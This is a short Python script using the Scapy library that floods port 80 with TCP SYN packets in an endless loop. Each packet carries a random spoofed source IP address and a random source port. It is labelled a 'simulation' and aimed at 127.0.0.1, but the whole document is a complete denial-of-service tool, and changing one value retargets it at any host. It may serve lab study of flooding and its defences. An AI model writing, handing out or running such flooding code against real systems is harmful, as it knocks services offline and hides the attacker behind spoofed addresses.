from scapy.all import *
import random
import time

target_ip = "127.0.0.1"   # local machine
target_port = 80

print("Starting SYN Flood simulation...")

while True:

    ip = IP(dst=target_ip, src=RandIP())
    tcp = TCP(
        sport=random.randint(1024,65535),
        dport=target_port,
        flags="S"
    )

    packet = ip/tcp

    send(packet, verbose=0)

    time.sleep(0.001)
